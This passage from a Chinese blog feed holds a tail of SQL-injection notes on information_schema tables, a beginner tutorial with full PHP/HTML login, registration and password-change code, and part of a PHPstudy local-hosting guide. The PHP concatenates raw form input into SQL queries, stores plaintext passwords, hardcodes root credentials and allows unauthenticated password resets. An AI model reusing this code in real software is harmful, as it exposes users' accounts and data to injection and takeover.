COLUMNS：存储了MySQL下每一个数据表中的所有列名</p><ul><li>COLUMN_NAME（字段）：字段名称</li><li>TABLE_NAME（字段）：该字段属于哪一个数据表</li><li>TABLE_SCHEMA（字段）：当前字段所属数据表所在的数据库名称</li></ul><p><strong>注意：这三张表在information_schema数据库下面，在SQL注入过程中不能直接指定表名，要使用“数据库名.数据表名”的形式，例如：information_schema.tables</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的登录页面</title>
    <link href="/2021/07/19/%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/"/>
    <url>/2021/07/19/%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我的上一篇文章中，我讲到了本地建站前的准备工作，包括MySQL数据库的创建。现在，我将为大家讲解编写注册和登录页面的详细过程。请大家认真理解源代码中的注释！这里的MySQL数据库，只涉及到单表的CRUD操作，所以不是很难。</p><p>P.S.由于下学期太忙，一直没有更新，暑假才有时间总结。网页已经做出来几个月了，过程可能记得不是很清楚了，如有疑问敬请在评论区提出，我会尽量解答！</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>CSS我不太会写，这里直接借鉴了某宝上的模板。因为注册和修改密码没有模板，所以只有最简单的HTML页面！</p><p>废话不多说，先上代码！</p><p>1.登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">//index.html<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;head&gt;<br><br>&lt;title&gt;登录页面（样例）&lt;/title&gt;<br><br>&lt;meta name=&quot;keywords&quot; content=&quot;登录界面素材&quot; /&gt;<br><br>&lt;meta name=&quot;description&quot; content=&quot;none&quot; /&gt;<br><br>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br>&lt;script<br>type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() &#123; setTimeout(hideURLbar, 0); &#125;, false); function hideURLbar()&#123; window.scrollTo(0,1); &#125; &lt;/script&gt;<br>&lt;!-- Custom Theme files --&gt;<br>&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;<br>&lt;!-- //Custom Theme files --&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>&lt;!-- main --&gt;<br>&lt;div class=&quot;main-w3layouts wrapper&quot;&gt;<br>&lt;h1&gt;登录页面&lt;/h1&gt;<br>&lt;div class=&quot;main-agileinfo&quot;&gt;<br>&lt;div class=&quot;agileits-top&quot;&gt;<br>&lt;form action=&quot;登录.php&quot; method=&quot;post&quot;&gt;<br>&lt;input class=&quot;text&quot; type=&quot;text&quot; name=&quot;Username&quot; placeholder=&quot;用户名&quot; required=&quot;&quot;&gt;<br>&lt;input class=&quot;text&quot; type=&quot;password&quot; name=&quot;Password&quot; placeholder=&quot;密码&quot; required=&quot;&quot;&gt;<br>&lt;div class=&quot;wthree-text&quot;&gt;<br>&lt;ul&gt;<br>&lt;li&gt;<br>&lt;label class=&quot;anim&quot;&gt;<br>&lt;input type=&quot;checkbox&quot; class=&quot;checkbox&quot;&gt;<br>&lt;span&gt; 记住我?(别点了，记不住的)&lt;/span&gt;<br>&lt;/label&gt;<br>&lt;/li&gt;<br>&lt;li&gt;&lt;a href=&quot;修改密码.html&quot;&gt;忘记密码?&lt;/a&gt; &lt;/li&gt;<br>&lt;/ul&gt;<br>&lt;div class=&quot;clear&quot;&gt; &lt;/div&gt;<br>&lt;/div&gt;<br>&lt;input type=&quot;submit&quot; value=&quot;登录&quot; &gt;<br>&lt;/form&gt;<br>&lt;p&gt;没有账号? &lt;a href=&quot;注册.html&quot; id=&quot;register&quot;&gt; 现在注册一个！&lt;/a&gt;&lt;/p&gt;<br>&lt;script&gt;<br>                    var register=document.getElementById(&#x27;register&#x27;);<br>register.addEventListener(&#x27;click&#x27;,function()&#123;<br>location.href=&#x27;注册.html&#x27;;<br>&#125;)<br>&lt;/script&gt;<br>&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;!-- copyright --&gt;<br>&lt;div class=&quot;w3copyright-agile&quot;&gt;<br>&lt;p&gt;© 2021 &lt;a href=&quot;http://terry906.top&quot;&gt;Terry Zhang&lt;/a&gt;. All rights reserved&lt;/p&gt;<br>&lt;/div&gt;<br>&lt;!-- //copyright --&gt;<br>&lt;ul class=&quot;w3lsg-bubbles&quot;&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;/li&gt;<br>&lt;/ul&gt;<br>&lt;/div&gt;<br>&lt;!-- //main --&gt;<br>&lt;/body&gt;<br><br>&lt;/html&gt;<br>//登录.php<br>&lt;?php<br>    $username = $_POST[&#x27;Username&#x27;];<br>    $password = $_POST[&#x27;Password&#x27;];<br>    $conn=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;12345678&quot;);<br>    if(!$conn)&#123;<br>    die(&quot;数据库连接失败！&quot;);<br>    &#125;<br>    mysqli_select_db($conn,&quot;www_test_com&quot;);<br>    mysqli_set_charset($conn,&#x27;utf-8&#x27;);<br>    //查询用户<br>    $chks = &quot;select username,password from obj_message where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;<br>    $result = mysqli_query($conn,$chks);<br>    if(mysqli_num_rows($result) &gt; 0)&#123;<br>    echo &quot;&lt;script&gt;location.href=&#x27;登录跳转.html&#x27;&lt;/script&gt;&quot;;<br>    &#125;else&#123;<br>    echo &quot;&lt;script&gt;alert(&#x27;用户名或密码错误!&#x27;);&lt;/script&gt;&quot;;<br>    echo &quot;&lt;script&gt;location.href=&#x27;index.html&#x27;&lt;/script&gt;&quot;;<br>    &#125;<br><br>mysqli_close($conn);<br>//登录成功.html<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;zh-CN&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;登录页面（样例）&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;div&gt;恭喜您，登录成功！&lt;/div&gt;&lt;br&gt;<br>    &lt;ul class=&quot;nav&quot;&gt;<br>        &lt;li&gt;<br>           &lt;a href=&quot;#&quot;&gt;我的&lt;/a&gt;<br>           &lt;ol&gt;<br>             &lt;li&gt;&lt;a href=&quot;#&quot;&gt;个人中心&lt;/a&gt;&lt;/li&gt;<br>             &lt;li&gt;&lt;a href=&quot;#&quot;&gt;积分&lt;/a&gt;&lt;/li&gt;<br>             &lt;li&gt;&lt;a href=&quot;index.html&quot;&gt;注销&lt;/a&gt;&lt;/li&gt;<br>           &lt;/ol&gt;<br>        &lt;/li&gt;<br>      &lt;/ul&gt;<br>      &lt;script&gt;<br>        var nav=document.querySelector(&#x27;.nav&#x27;);<br>        var lis=nav.children;<br>        for(var i=0;i&lt;lis.length;i++)&#123;<br>          lis[i].onmouseover=function ()&#123;<br>            this.children[i].style.display=&#x27;block&#x27;;<br>            &#125;<br>          lis[i].onmouseout=function ()&#123;<br>            this.children[i].style.display=&#x27;none&#x27;;<br>          &#125;<br>        &#125;<br>      &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>//登录跳转.html<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;zh-CN&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;登录跳转页（样例）&lt;/title&gt;<br>    &lt;style&gt;<br>        .sp&#123;font-size: 50px;&#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;span&gt;&lt;img src=&quot;正确.png&quot; width=&quot;60px&quot;/&gt;&lt;/span&gt;<br>    &lt;span class=&quot;sp&quot;&gt;&lt;/span&gt;<br>    &lt;script&gt;<br>        var sp=document.querySelector(&#x27;.sp&#x27;);<br>        var timer=5;<br>        setInterval(function()&#123;<br>            if(timer==0)&#123;<br>                location.href=&#x27;登录成功.html&#x27;;<br>            &#125;else&#123;<br>                sp.innerHTML=&#x27;&lt;strong&gt;登录成功！您将在&#x27;+timer+&#x27;秒钟跳转！&lt;/strong&gt;&#x27;;<br>                timer--;<br>            &#125;<br>        &#125;,1000);<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>2.注册</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">//注册.html<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;zh-CN&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;注册页面（样例）&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1 align=&quot;center&quot;&gt;注册账号&lt;/h1&gt;<br>    &lt;form action=&quot;注册信息.php&quot; method=&quot;post&quot;&gt;<br>        用户名:&lt;input type=&quot;text&quot; value=&quot;请输入用户名&quot; id=&quot;username&quot; name=&quot;username&quot; required/&gt;&lt;br&gt;<br>        密码:&lt;input type=&quot;text&quot; value=&quot;请输入6-16位密码&quot; id=&quot;pwd1&quot; name=&quot;password&quot; required/&gt;&lt;br&gt;<br>        确认密码:&lt;input type=&quot;text&quot; value=&quot;请再次输入&quot; id=&quot;pwd2&quot; name=&quot;repassword&quot; required/&gt;&lt;br&gt;<br>        &lt;script&gt;<br>            var pwd1=document.getElementById(&#x27;pwd1&#x27;);<br>            var pwd2=document.getElementById(&#x27;pwd2&#x27;);<br>            var username=document.getElementById(&#x27;username&#x27;);<br>            var flag1=0;<br>            var flag2=0;<br>            username.onfocus=function()&#123;<br>                if(username.value===&#x27;请输入用户名&#x27;)&#123;<br>                    username.value=&#x27;&#x27;;<br>                &#125;<br>                username.style.color=&#x27;#333&#x27;;//onfocus是得到焦点，#333是黑色<br>            &#125;<br>            username.onblur=function()&#123;<br>                if(username.value===&#x27;&#x27;)&#123;<br>                    username.value=&#x27;请输入用户名&#x27;;<br>                &#125;<br>                username.style.color=&#x27;#999&#x27;;//onblur是失去焦点，#999是灰色<br>            &#125;<br>            pwd1.onfocus=function()&#123;<br>                if(pwd1.value===&#x27;请输入6-16位密码&#x27;)&#123;<br>                    pwd1.value=&#x27;&#x27;;<br>                    pwd1.type=&#x27;password&#x27;;<br>                &#125;<br>                pwd1.style.color=&#x27;#333&#x27;;<br>            &#125;<br>            pwd2.onfocus=function()&#123;<br>                if(pwd2.value===&#x27;请再次输入&#x27;)&#123;<br>                    pwd2.value=&#x27;&#x27;;<br>                    pwd2.type=&#x27;password&#x27;;<br>                &#125;<br>                pwd2.style.color=&#x27;#333&#x27;;<br>            &#125;<br>        &lt;/script&gt;<br>        &lt;input type=&quot;submit&quot; value=&quot;注册&quot; id=&quot;zc&quot;&gt;<br>        &lt;script&gt;<br>            var zc=document.getElementById(&#x27;zc&#x27;);<br>            zc.addEventListener(&#x27;click&#x27;,function()&#123;<br>                location.href=&quot;index.html&quot;;<br>            &#125;)<br>        &lt;/script&gt;<br>    &lt;/form&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br>//注册跳转.html<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;zh-CN&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;<br>    &lt;title&gt;注册跳转页（样例）&lt;/title&gt;<br>    &lt;style&gt;<br>        .sp&#123;font-size: 50px;&#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;span&gt;&lt;img src=&quot;正确.png&quot; width=&quot;60px&quot;/&gt;&lt;/span&gt;<br>&lt;span class=&quot;sp&quot;&gt;&lt;/span&gt;<br>&lt;script&gt;<br>    var sp=document.querySelector(&#x27;.sp&#x27;);<br>    var timer=5;<br>    setInterval(function()&#123;<br>        if(timer==0)&#123;<br>            location.href=&#x27;index.html&#x27;;<br>        &#125;else&#123;<br>            sp.innerHTML=&#x27;&lt;strong&gt;注册成功！您将在&#x27;+timer+&#x27;秒钟跳转！&lt;/strong&gt;&#x27;;<br>            timer--;<br>        &#125;<br>    &#125;,1000);<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>//注册信息.php<br>&lt;?php<br>    $username=$_POST[&#x27;username&#x27;];<br>    $password=$_POST[&#x27;password&#x27;];<br>    $repassword=$_POST[&#x27;repassword&#x27;];<br>    if($password!=$repassword)<br>    &#123;<br>    echo &quot;&lt;script&gt;alert(&#x27;两次密码不一致！&#x27;)&lt;/script&gt;&quot;;<br>    exit();<br>    &#125;<br>     $arr=$_POST;<br>     $conn=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;12345678&quot;);<br>     if(!$conn)&#123;<br>         die(&quot;数据库连接失败！&quot;);<br>     &#125;<br>     mysqli_select_db($conn,&quot;www_test_com&quot;);<br>     mysqli_set_charset($conn,&#x27;utf-8&#x27;);<br>    $chk = &quot;select username from user where username = &#x27;$username&#x27;&quot;;<br>    $result = mysqli_query($conn,$chk);<br>    if(mysqli_num_rows($result) &gt; 0)<br>    &#123;<br>    echo &quot;&lt;script&gt;alert(\&quot;该用户名已被注册\&quot;);&lt;/script&gt;&quot;;<br>    exit();<br>    &#125;<br>     $sql=&quot;insert into obj_message set username=&#x27;$_POST[username]&#x27;,password=&#x27;$_POST[password]&#x27;,repassword=&#x27;$_POST[repassword]&#x27;&quot;;<br>     $check=mysqli_query($conn,$sql);<br>     if($check)<br>     &#123;<br>         echo &quot;&lt;script&gt;location.href=&#x27;注册跳转.html&#x27;;&lt;/script&gt;&quot;;<br>     &#125;<br>     else<br>     &#123;<br>         echo &quot;&lt;script&gt;location.href=&#x27;#&#x27;;&lt;/script&gt;&quot;;<br>     &#125;<br>     mysqli_close($conn);<br></code></pre></td></tr></table></figure><p>  哦，差点忘了还有修改密码的页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">//修改密码.html<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;zh-CN&quot;&gt;<br>&lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot;&gt;<br>    &lt;title&gt;修改密码（样例）&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;修改密码&lt;/h1&gt;&lt;br&gt;<br>    &lt;form action=&quot;修改密码.php&quot; method=&quot;POST&quot;&gt;<br>    用户名：&lt;input type=&quot;text&quot; name=&quot;usernames&quot; required /&gt;&lt;br&gt;<br>    修改密码：&lt;input type=&quot;password&quot; name=&quot;cgpwd&quot; required /&gt;&lt;br&gt;<br>    确认密码：&lt;input type=&quot;password&quot; name=&quot;recgpwd&quot; required /&gt;&lt;br&gt;<br>    &lt;input type=&quot;submit&quot; value=&quot;修改&quot; id=&quot;change&quot; /&gt;<br>    &lt;/form&gt;<br>    <br>&lt;/body&gt;<br>&lt;/html&gt;<br>//修改密码.php<br>&lt;?php<br>    $usernames=$_POST[&#x27;usernames&#x27;];<br>    $cgpwd=$_POST[&#x27;cgpwd&#x27;];<br>    $recgpwd=$_POST[&#x27;recgpwd&#x27;];<br>    if($cgpwd!=$recgpwd)<br>    &#123;<br>        echo &quot;&lt;script&gt;alert(&#x27;两次输入的新密码不一致！&#x27;);&lt;/script&gt;&quot;;<br>        exit();<br>    &#125;<br>    $conn=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;12345678&quot;);<br>    if(!$conn)&#123;<br>    die(&quot;数据库连接失败！&quot;);<br>    &#125;<br>    mysqli_select_db($conn,&quot;www_test_com&quot;);<br>    mysqli_set_charset($conn,&#x27;utf-8&#x27;);<br>//查询用户<br>    $chkss = &quot;select username from obj_message where username=&#x27;$usernames&#x27;&quot;;<br>    $results = mysqli_query($conn,$chkss);<br>    if(mysqli_num_rows($results) &gt; 0)&#123;<br>        ;<br>    &#125;else&#123;<br>    echo &quot;&lt;script&gt;alert(&#x27;该用户名不存在!&#x27;);&lt;/script&gt;&quot;;<br>    echo &quot;&lt;script&gt;location.href=&#x27;index.html&#x27;;&lt;/script&gt;&quot;;<br>    &#125;<br>    $sqls=&quot;update obj_message set password=&#x27;$_POST[cgpwd]&#x27;,repassword=&#x27;$_POST[recgpwd]&#x27; where username=&#x27;$_POST[usernames]&#x27;&quot;;<br>    $qs=mysqli_query($conn,$sqls);<br>    if($qs)<br>    &#123;<br>        echo &quot;&lt;script&gt;alert(&#x27;修改成功！&#x27;);&lt;/script&gt;&quot;;<br>        echo &quot;&lt;script&gt;location.href=&#x27;index.html&#x27;;&lt;/script&gt;&quot;;<br>    &#125;<br>    else<br>    &#123;<br>        echo  &quot;&lt;script&gt;alert(&#x27;修改失败！&#x27;);&lt;/script&gt;&quot;;<br>        echo &quot;&lt;script&gt;location.href=&#x27;#&#x27;;&lt;/script&gt;&quot;;<br>    &#125;<br>    mysqli_close($conn);<br></code></pre></td></tr></table></figure><p>P.S.由于我是在PHPstudy上进行测试，所以IP地址一律填127.0.0.1，如果不是本机就填MySQL服务器IP！代码中的root和12345678分别为数据库账号和密码，因人而异！</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>最后我发现，其实可以把连接数据库的PHP代码单独写成一个文件，然后在其它页面通过文件包含的相关函数（例如<code>include()</code>，<code>require()</code>）进行引用，这样可以减少代码量。首页的“记住密码”是假的，我想今后可以通过session会话的方式实现。</p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPstudy本地建站</title>
    <link href="/2021/04/04/PHPstudy%E6%9C%AC%E5%9C%B0%E5%BB%BA%E7%AB%99/"/>
    <url>/2021/04/04/PHPstudy%E6%9C%AC%E5%9C%B0%E5%BB%BA%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  在经过了两周的学习以后，我终于结束了web前端（HTML5，JavaScript）部分内容以及后端（PHP，MySQL）部分内容的学习。通过这段时间的学习，我已经可以独立做出一个登录和注册的页面，并将其内容提交至MySQL数据库。下面，我将为大家详细介绍我搭建登录和注册页面的全过程。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>  对于小白来说，我不推荐租借或购买虚拟主机（VPS）进行搭建网站的相关练习，因为搭建环境比较复杂，新手不容易理解。我们可以在电脑上下载PHPstudy本地建站，一键部署WAMP(Windows+Apache+MySQL+PHP)环境，利用虚拟域名来模拟网站环境。</p><p>  首先，我们先前往PHPstudy官网下载小皮面板。下载完毕后，点击WAMP旁边的“启动”按钮，安装相关环境。安装完成后，点击左侧边栏的“网站”。</p><p><img src="https://s2.loli.net/2022/09/16/CaVSj7RLeuko4HE.png" alt="img"></p><p>  然后在“域名”里面填写www开头的网址，这里以<a href="http://www.test.com为例.填写网址之后勾选“创建数据库”,并设置账号密码./">www.test.com为例。填写网址之后勾选“创建数据库”，并设置账号密码。</a></p><p><img src="https://s2.loli.net/2022/09/16/BH6TULFwRIXtOl3.png" alt="img"></p><p><img src="https://s2.loli.net/2022/09/16/23SqfcMVgL9nIUx.png" alt="img"></p><p>  准备就绪后前往你电脑中的“phpstudy_pro”文件夹，找到“WWW”子文件夹下面以刚才自定义域名为名字的文件夹，并将已经创建好的网页文件夹复制进去。后面我会具体讲到登录和注册的制作过程。</p><p><img src="https://s2.loli.net/2022/09/16/cgIMYaHmfUZkPw7.png" alt="img"></p><p>​    双击PHPstudy“网站”下面的“物理路径”，并选择复制进来的网页文件夹。注意网页文件中必须有一个文件是index.html，否则需要在“管理”的“修改”里面更改“网站首页”才可以看到你制作的网页。</p><p><img src="https://s2.loli.net/2022/09/16/gjsM2db9c84JNlF.png" alt="img"></p><p>  前往“软件管理”中下载并安装数据库管理工具sqlfront。新手推荐使用这个，因为它是图形化界面。</p><p><img src="https://s2.loli.net/2022/09/16/5nkIqYtPm1iTa3C.png" alt="img"></p><p>  进入之后，点击“新建”来创建一个登录信息。</p><p><img src="https://s2.loli.net/2022/09/16/Iigj29aocAqeX6G.png" alt="img"></p><p>  “host”一栏填写默认本机IP–127.0.0.1，然后在下方选中你刚才创建的数据库。</p><p><img src="https://s2.loli.net/2022/09/16/lVwT1IrHzoDdfyA.png" alt="img"></p><p>  打开以后双击刚才创建的数据库，光标移至上面并右击“新建”–“表格”，弹出以下窗口。</p><p><img 